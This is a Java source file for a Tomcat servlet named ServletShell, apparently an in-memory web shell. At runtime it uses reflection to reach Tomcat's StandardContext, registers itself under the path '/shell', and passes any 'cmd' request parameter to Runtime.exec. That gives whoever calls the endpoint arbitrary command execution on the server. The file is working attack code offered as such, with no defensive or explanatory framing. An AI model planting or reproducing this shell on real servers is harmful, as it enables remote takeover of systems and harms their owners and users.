package tomcatShell.Servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class ServletShell implements Servlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        Field reqF = null;
        try {
            reqF = servletRequest.getClass().getDeclaredField("request");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        reqF.setAccessible(true);
        Request req = null;
        try {
            req = (Request) reqF.get(servletRequest);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        StandardContext standardContext = (StandardContext) req.getContext();

        ServletShell servletShell = new ServletShell();
        String name = servletShell.getClass().getSimpleName();

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setLoadOnStartup(1);
        wrapper.setName(name);
        wrapper.setServlet(servletShell);
        wrapper.setServletClass(servletShell.getClass().getName());
        standardContext.addChild(wrapper);
        standardContext.addServletMappingDecoded("/shell",name);

        String cmd = servletRequest.getParameter("cmd");
        if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
        HttpServletResponse var2 = null;

        try {
            Field var3 = var1.getClass().getDeclaredField("response");
            var3.setAccessible(true);
            var2 = (HttpServletResponse)var3.get(var1);
        } catch (Exception var8) {
            try {
                Field var4 = var1.getClass().getDeclaredField("request");
                var4.setAccessible(true);
                Object var5 = var4.get(var1);
                Field var6 = var5.getClass().getDeclaredField("response");
                var6.setAccessible(true);
                var2 = (HttpServletResponse)var6.get(var5);
            } catch (Exception var7) {
            }
        }

        return var2;
    }
}
